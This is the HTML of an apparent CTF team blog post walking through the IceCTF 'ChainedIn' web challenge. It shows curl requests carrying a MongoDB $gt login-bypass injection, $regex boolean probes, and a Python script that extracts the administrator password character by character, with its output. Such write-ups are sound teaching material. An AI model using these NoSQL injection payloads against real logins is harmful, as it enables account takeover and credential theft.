@@ -1,0 +1,502 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  <!-- Color theme for statusbar -->
+  <meta name="theme-color" content="#000000" />
+  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
+  <meta http-equiv="window-target" content="_top" />
+  
+  <title>IceCTF [Web] - ChainedIn | TeamRocketIST - Portuguese CTF Team</title>
+  <meta name="description" content="The objective on this one was to get the administrator password on the website. http://chainedin.vuln.icec.tf/ This  first thing we can see is that this level is powered by MongoDB and angular.js, we">
+<meta name="keywords" content="web,noSql,mongodb">
+<meta property="og:type" content="article">
+<meta property="og:title" content="IceCTF [Web] - ChainedIn">
+<meta property="og:url" content="https://teamrocketist.github.io/2016/08/26/IceCTF-Web-ChainedIn/index.html">
+<meta property="og:site_name" content="TEAMROCKETIST">
+<meta property="og:description" content="The objective on this one was to get the administrator password on the website. http://chainedin.vuln.icec.tf/ This  first thing we can see is that this level is powered by MongoDB and angular.js, we">
+<meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2017-08-10T02:46:39.174Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="IceCTF [Web] - ChainedIn">
+<meta name="twitter:description" content="The objective on this one was to get the administrator password on the website. http://chainedin.vuln.icec.tf/ This  first thing we can see is that this level is powered by MongoDB and angular.js, we">
+  
+    <link rel="alternate" href="/atom.xml" title="TEAMROCKETIST" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/images/avatar.png" type="image/x-icon">
+  
+  <!-- font-awesome CSS -->
+  <link href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+
+
+<body class="main-center">
+  <section class="mainside">
+  <div class="slimContent">
+    <div class="navbar-header">
+      
+      
+      <div class="profile-block text-center">
+        <a id="avatar" href="https://github.com/teamrocketist" target="_blank">
+          <img class="thumb-xl img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200">
+        </a>
+        <h2 id="name" class="hidden-xs hidden-sm">TeamRocketIST</h2>
+        <h3 id="title" class="hidden-xs hidden-sm hidden-md">CTF Team</h3>
+        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="fa fa-map-marker"></i> Lisbon, Portugal</small>
+      </div>
+      
+      <div class="search" id="search-form-wrap">
+
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="Search" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat"><i class="fa fa-search"></i></button>
+            </span>
+        </div>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="Type something..." x-webkit-speech />
+            <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+            <!-- <span class="ins-close ins-selectable"><i class="fa fa-times"></i></span> -->
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+
+</div>
+      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+    </div>
+    <nav id="main-navbar" class="collapse navbar-collapse">
+      <ul class="nav navbar-nav main-nav">
+        
+        
+        <li class="menu-item menu-item-home">
+          <a href="/.">
+            
+            <i class="fa fa-fw fa-home"></i>
+            
+            <span class="menu-title">Home</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            
+            <i class="fa fa-fw fa-archive"></i>
+            
+            <span class="menu-title">Archives</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories">
+            
+            <i class="fa fa-fw fa-folder"></i>
+            
+            <span class="menu-title">Categories</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            
+            <i class="fa fa-fw fa-tags"></i>
+            
+            <span class="menu-title">Tags</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-repository">
+          <a href="/repository">
+            
+            <i class="fa fa-fw fa-code"></i>
+            
+            <span class="menu-title">Repository</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links">
+            
+            <i class="fa fa-fw fa-gg"></i>
+            
+            <span class="menu-title">Links</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            
+            <i class="fa fa-fw fa-coffee"></i>
+            
+            <span class="menu-title">About</span>
+          </a>
+        </li>
+        
+      </ul>
+      <div class="footer">
+	
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/teamrocketist" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="fa fa-github"></i></a></li>
+        
+        <li><a href="https://twitter.com/teamrocketist" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="fa fa-twitter"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="fa fa-rss"></i></a></li>
+        
+    </ul>
+    
+    <div class="copyright">
+        &copy; 2017 TEAMROCKETIST
+        <div class="publishby">
+        	<!-- Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>. -->
+        	Theme by <a href="https://github.com/cofess" target="_blank"> cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.
+        </div>
+    </div>
+</div>
+    </nav>
+  </div>
+</section>
+
+  
+    <section class="sidebar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">Board</h3>
+    <div class="widget-body">
+        <div id="board">
+            
+            <div class="content">
+                <p>PC MASTER RACE!</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget-body">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Crypto/">Crypto</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Forensics/">Forensics</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Misc/">Misc</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Network/">Network</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Reverse/">Reverse</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web/">Web</a><span class="category-list-count">7</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget-body">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/LTE/">LTE</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Misc/">Misc</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RSA/">RSA</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/X-Forwarded-For/">X-Forwarded-For</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/base64/">base64</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/bruteforce/">bruteforce</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/crypto/">crypto</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/filterbypass/">filterbypass</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/forensics/">forensics</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/gdb/">gdb</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hash/">hash</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java/">java</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/login/">login</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/md5/">md5</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mongodb/">mongodb</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/network/">network</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/noSql/">noSql</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pcap/">pcap</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/perl/">perl</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/png/">png</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/regex/">regex</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/reverse/">reverse</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shellshock/">shellshock</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql/">sql</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sqli/">sqli</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/usb/">usb</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/">web</a><span class="tag-list-count">7</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wireshark/">wireshark</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xor/">xor</a><span class="tag-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget-body tagcloud">
+      <a href="/tags/LTE/" style="font-size: 13px;">LTE</a> <a href="/tags/Misc/" style="font-size: 13px;">Misc</a> <a href="/tags/RSA/" style="font-size: 13px;">RSA</a> <a href="/tags/X-Forwarded-For/" style="font-size: 13px;">X-Forwarded-For</a> <a href="/tags/base64/" style="font-size: 13px;">base64</a> <a href="/tags/bruteforce/" style="font-size: 13.33px;">bruteforce</a> <a href="/tags/crypto/" style="font-size: 13.67px;">crypto</a> <a href="/tags/filterbypass/" style="font-size: 13px;">filterbypass</a> <a href="/tags/forensics/" style="font-size: 13px;">forensics</a> <a href="/tags/gdb/" style="font-size: 13px;">gdb</a> <a href="/tags/hash/" style="font-size: 13px;">hash</a> <a href="/tags/java/" style="font-size: 13px;">java</a> <a href="/tags/login/" style="font-size: 13px;">login</a> <a href="/tags/md5/" style="font-size: 13.33px;">md5</a> <a href="/tags/mongodb/" style="font-size: 13px;">mongodb</a> <a href="/tags/network/" style="font-size: 13px;">network</a> <a href="/tags/noSql/" style="font-size: 13px;">noSql</a> <a href="/tags/pcap/" style="font-size: 13px;">pcap</a> <a href="/tags/perl/" style="font-size: 13px;">perl</a> <a href="/tags/png/" style="font-size: 13px;">png</a> <a href="/tags/python/" style="font-size: 13px;">python</a> <a href="/tags/regex/" style="font-size: 13px;">regex</a> <a href="/tags/reverse/" style="font-size: 13.67px;">reverse</a> <a href="/tags/shellshock/" style="font-size: 13px;">shellshock</a> <a href="/tags/sql/" style="font-size: 13px;">sql</a> <a href="/tags/sqli/" style="font-size: 13px;">sqli</a> <a href="/tags/usb/" style="font-size: 13px;">usb</a> <a href="/tags/web/" style="font-size: 14px;">web</a> <a href="/tags/wireshark/" style="font-size: 13px;">wireshark</a> <a href="/tags/xor/" style="font-size: 13px;">xor</a>
+    </div>
+  </div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Archive</h3>
+    <div class="widget-body">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/09/">September 2016</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a><span class="archive-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget-body">
+      <ul class="recent-post-list list-unstyled no-thumbnail">
+        
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/Network/">Network</a>
+              </p>
+              <p class="item-title">
+                <a href="/2017/08/07/Network-Sha2017-Abuse-Mail-300/" class="title">[Network] Sha2017 - Abuse Mail [300]</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2017-08-07T12:52:21.000Z" itemprop="datePublished">2017-08-07</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/Web/">Web</a>
+              </p>
+              <p class="item-title">
+                <a href="/2017/08/02/Web-Bugs-Bunny-CTF-LQI-X-140/" class="title">[Web] Bugs Bunny CTF - LQI_X 140</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2017-08-02T10:29:58.000Z" itemprop="datePublished">2017-08-02</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/Reverse/">Reverse</a>
+              </p>
+              <p class="item-title">
+                <a href="/2017/08/01/Reverse-BugsBunny-CTF-Rev75/" class="title">[Reverse] BugsBunny CTF - Rev75</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2017-08-01T08:03:50.000Z" itemprop="datePublished">2017-08-01</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/Reverse/">Reverse</a>
+              </p>
+              <p class="item-title">
+                <a href="/2017/07/31/Reverse-Bugs-Bunny-CTF-Rev100/" class="title">[Reverse] Bugs Bunny CTF - Rev100</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2017-07-31T15:14:17.000Z" itemprop="datePublished">2017-07-31</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/Reverse/">Reverse</a>
+              </p>
+              <p class="item-title">
+                <a href="/2017/07/31/Reverse-Bugs-Bunny-CTF-Rev-50/" class="title">[Reverse] - Bugs Bunny CTF - Rev 50</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2017-07-31T14:16:03.000Z" itemprop="datePublished">2017-07-31</time>
+              </p>
+            </div>
+          </li>
+          
+      </ul>
+    </div>
+  </div>
+  
+
+    
+  </div>
+</section>
+
+  
+  <section class="main">
+  <div class="content">
+  <article id="post-IceCTF-Web-ChainedIn" class="article article-type-post" itemscope itemprop="blogPost">
+    
+    <header class="article-header">
+      
+        
+  
+    <h1 class="article-title" itemprop="name">
+      IceCTF [Web] - ChainedIn
+    </h1>
+  
+
+      
+      <div class="article-meta">
+        <span class="article-date">
+    <i class="fa fa-calendar-check-o"></i>
+	<a href="/2016/08/26/IceCTF-Web-ChainedIn/" class="article-date">
+	  <time datetime="2016-08-26T17:58:58.000Z" itemprop="datePublished">2016-08-26</time>
+	</a>
+</span>
+        
+  <span class="article-category">
+    <i class="fa fa-folder"></i>
+    <a class="article-category-link" href="/categories/Web/">Web</a>
+  </span>
+
+        
+  <span class="article-tag">
+    <i class="fa fa-tag"></i>
+	<a class="article-tag-link" href="/tags/mongodb/">mongodb</a>, <a class="article-tag-link" href="/tags/noSql/">noSql</a>, <a class="article-tag-link" href="/tags/web/">web</a>
+  </span>
+
+
+        
+
+		
+		
+	
+		<span class="post-wordcount hidden-xs">Word Count: 437 (words)</span>
+	
+	
+		<span class="post-readcount hidden-xs">Read Time: 3 (min)</span>
+	
+
+      </div>
+    </header>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>The objective on this one was to get the administrator password on the website.</p>
+<p><a href="http://chainedin.vuln.icec.tf/" target="_blank" rel="external">http://chainedin.vuln.icec.tf/</a></p>
+<p>This  first thing we can see is that this level is powered by MongoDB and angular.js, we can start thinking about finding some nosql injection from here.</p>
+<p>After reading something here I saw it was possible to inject mongodb <a href="http://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb.html" target="_blank" rel="external">http://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb.html</a>. Tryed to do the most common injection to bypass the login:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">kinyabitch@Debian ~/h/c/chainedin&gt; curl -H <span class="string">"Content-Type: application/json"</span> -d <span class="string">'&#123;"user": &#123;"$gt": ""&#125;,"pass": &#123;"$gt": ""&#125;&#125;'</span> <span class="string">'http://chainedin.vuln.icec.tf/login'</span></div><div class="line">&#123;<span class="string">"message"</span>:<span class="string">"Welcome back Administrator!"</span>&#125;</div></pre></td></tr></table></figure>
+<p>And voila i’m logged in as the admin, but can’t find the flag so I started thinking maybe there is a way to modify the injection (something like  a boolean based or timed based injection like in we do on normal sql injections) after some reading on mongodb documentation(<a href="https://docs.mongodb.com/manual/reference/operator/query/regex/" target="_blank" rel="external">https://docs.mongodb.com/manual/reference/operator/query/regex/</a>) I found this $regex parameter was perfect for boolean injection, we could retrieve the password character by character like this:</p>
+<p>You can see here when we start the construction of our flag we receive a “true” boolean message saying “welcome back administrator”:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"></div><div class="line">kinyabitch@Debian ~/h/c/chainedin&gt; curl -H <span class="string">"Content-Type: application/json"</span> -d <span class="string">'&#123;"user": &#123;"$gt": ""&#125;,"pass": &#123;"$regex": "IceCT"&#125;&#125;'</span> <span class="string">'http://chainedin.vuln.icec.tf/login'</span></div><div class="line">&#123;<span class="string">"message"</span>:<span class="string">"Welcome back Administrator!"</span>;&#125;</div></pre></td></tr></table></figure>
+<p>But if we put an invalid character we will get the message “Invalid Credentials”, so with this we get our “False” boolean.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"></div><div class="line">kinyabitch@Debian ~/h/c/chainedin&amp;gt; curl -H <span class="string">';Content-Type: application/json'</span>; -d <span class="string">'&#123;"user": &#123;"$gt": ""&#125;,"pass": &#123;"$regex": "IceCTA"&#125;&#125;'</span> <span class="string">'http://chainedin.vuln.icec.tf/login'</span></div><div class="line">&#123;<span class="string">"message"</span>:<span class="string">"Invalid Credentials"</span>&#125;</div></pre></td></tr></table></figure>
+<p>With this we can brute force the password character by character getting the flag :) here is the python script I wrote:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> json</div><div class="line"><span class="keyword">import</span> cookielib</div><div class="line"></div><div class="line">flag = <span class="string">'IceCTF&#123;'</span>;</div><div class="line">blacklist = []</div><div class="line">alphabet = <span class="string">'abcdefghijklmnopqrstuvxwyzABCDEFGHIJKLMNOPQRSTUVXWYZ0123456789_&#123;&#125;'</span></div><div class="line">count = <span class="number">0</span></div><div class="line">max = len(alphabet)</div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> alphabet:</div><div class="line">        url = <span class="string">"http://chainedin.vuln.icec.tf/login"</span>;</div><div class="line">        data = &#123;<span class="string">"user"</span>: &#123;<span class="string">"$gt"</span>: <span class="string">"Administrator"</span>&#125;,<span class="string">"pass"</span>: &#123;<span class="string">"$regex"</span>: <span class="string">"%s"</span> % flag + char&#125;&#125;</div><div class="line">        headers = &#123;<span class="string">'Content-type'</span>: <span class="string">'application/json'</span>, <span class="string">'Accept'</span>: <span class="string">'text/plain'</span>&#125;</div><div class="line">        r = requests.post(url, data=json.dumps(data), headers=headers)</div><div class="line">        <span class="keyword">if</span> (r.text == <span class="string">'&#123;"message":"Welcome back Administrator!"&#125;'</span>):</div><div class="line">            count = <span class="number">0</span></div><div class="line">            flag += char</div><div class="line">            <span class="keyword">print</span> flag</div><div class="line">            <span class="keyword">if</span> char == <span class="string">'&#125;'</span>:</div><div class="line">                exit(<span class="number">0</span>)</div></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">kinyabitch@Debian ~/h/c/chainedin&gt; python chained.py </div><div class="line">IceCTF&#123;I</div><div class="line">IceCTF&#123;I_</div><div class="line">IceCTF&#123;I_t</div><div class="line">IceCTF&#123;I_th</div><div class="line">IceCTF&#123;I_thO</div><div class="line">IceCTF&#123;I_thOu</div><div class="line">IceCTF&#123;I_thOug</div><div class="line">IceCTF&#123;I_thOugH</div><div class="line">IceCTF&#123;I_thOugHT</div><div class="line">IceCTF&#123;I_thOugHT_</div><div class="line">IceCTF&#123;I_thOugHT_Y</div><div class="line">IceCTF&#123;I_thOugHT_YO</div><div class="line">IceCTF&#123;I_thOugHT_YOu</div><div class="line">IceCTF&#123;I_thOugHT_YOu_</div><div class="line">IceCTF&#123;I_thOugHT_YOu_c</div><div class="line">IceCTF&#123;I_thOugHT_YOu_co</div><div class="line">IceCTF&#123;I_thOugHT_YOu_cou</div><div class="line">IceCTF&#123;I_thOugHT_YOu_coul</div><div class="line">IceCTF&#123;I_thOugHT_YOu_coulD</div><div class="line">IceCTF&#123;I_thOugHT_YOu_coulDN</div><div class="line">IceCTF&#123;I_thOugHT_YOu_coulDNt</div><div class="line">IceCTF&#123;I_thOugHT_YOu_coulDNt_</div><div class="line">IceCTF&#123;I_thOugHT_YOu_coulDNt_i</div><div class="line">IceCTF&#123;I_thOugHT_YOu_coulDNt_in</div><div class="line">IceCTF&#123;I_thOugHT_YOu_coulDNt_inJ</div><div class="line">IceCTF&#123;I_thOugHT_YOu_coulDNt_inJe</div><div class="line">IceCTF&#123;I_thOugHT_YOu_coulDNt_inJeC</div><div class="line">IceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt</div><div class="line">IceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_</div><div class="line">IceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_n</div><div class="line">IceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_no</div><div class="line">IceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noS</div><div class="line">IceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noSq</div><div class="line">IceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noSqL</div><div class="line">IceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noSqL_</div><div class="line">IceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noSqL_t</div><div class="line">IceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noSqL_tH</div><div class="line">IceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noSqL_tHa</div><div class="line">IceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noSqL_tHan</div><div class="line">IceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noSqL_tHanK</div><div class="line">IceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noSqL_tHanKs</div><div class="line">IceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noSqL_tHanKs_</div><div class="line">IceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noSqL_tHanKs_m</div><div class="line">IceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noSqL_tHanKs_mo</div><div class="line">IceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noSqL_tHanKs_mon</div><div class="line">IceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noSqL_tHanKs_monG</div><div class="line">IceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noSqL_tHanKs_monGo</div><div class="line">IceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noSqL_tHanKs_monGo&#125;</div></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <blockquote>
+  <ul class="post-copyright list-unstyled">
+    
+    <li class="post-copyright-link">
+      <strong>Link to this article：</strong>
+      <a href="https://teamrocketist.github.io/2016/08/26/IceCTF-Web-ChainedIn/" title="IceCTF [Web] - ChainedIn" target="_blank" rel="external">https://teamrocketist.github.io/2016/08/26/IceCTF-Web-ChainedIn/</a>
+    </li>
+    
+    <!--li class="post-copyright-license">
+      <strong>版权声明： </strong> 本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！
+    </li-->
+  </ul>
+</blockquote>
+
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/teamrocketist" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="/images/avatar.jpg" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/teamrocketist" target="_blank"><span class="text-dark">TeamRocketIST</span><small class="ml-1x">CTF Team</small></a></h3>
+        <div>Portuguese Computer Science Students</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+
+    </footer>
+  </article>
+  
+    
+  <div id="comments"></div>
+
+
+  
+</div>
+
+  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  
+  <ul class="pager pull-left">
+    
+    <li class="prev">
+      <a href="/2016/08/26/IceCTF-Cryptography-Hill-Cipher/" title="IceCTF [Cryptography] - Hill Cipher"><i class="fa fa-angle-left" aria-hidden="true"></i>&nbsp;&nbsp;Newer</a>
+    </li>
+    
+    
+    <li class="next">
+      <a href="/2016/08/07/Trend-Micro-Online-Qualifier-Misc-200/" title="Trend Micro Online Qualifier - Misc 200">Older&nbsp;&nbsp;<i class="fa fa-angle-right" aria-hidden="true"></i></a>
+    </li>
+    
+  </ul>
+  
+  
+  
+  <div class="bar-right">
+    <div class="share-component" data-sites="facebook,twitter" data-mobile-sites="facebook,twitter"></div>
+  </div>
+  
+</nav>
+
+</section>
+
+  <script src="https://cdn.bootcss.com/jquery/1.12.4/jquery.min.js"></script>
+<script>
+window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+<script src="/js/plugin.js"></script>
+<script src="/js/application.js"></script>
+
+
+
+  <script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+<script src="/js/insight.js"></script>
+
+
+
+
+
+</body>
+</html>
